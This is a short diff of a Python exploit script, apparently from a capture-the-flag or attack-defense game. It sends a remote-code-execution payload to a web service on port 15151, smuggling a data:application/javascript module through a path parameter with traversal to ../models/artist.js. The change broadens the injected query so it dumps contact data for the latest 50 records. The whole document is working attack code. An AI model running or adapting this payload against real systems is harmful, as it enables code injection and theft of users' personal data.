@@ -5,9 +5,8 @@ import requests
 import base64
 
 ip = sys.argv[1]
-hint = sys.argv[2]
 
-rce_payload = 'import model from "file:///app/models/artist.js"; export default {findById: async () => await model.find({name: "'+hint+'"}).select({contact:1}) }' 
+rce_payload = 'import model from "file:///app/models/artist.js"; export default {findById: async () => await model.find({}).select({contact:1}).sort({ _id: -1}).limit(50) }' 
 url = f"http://{ip}:15151/api/entity/1?path=data:application/javascript,{rce_payload}// ../models/artist.js"
 
 def malformed_token():
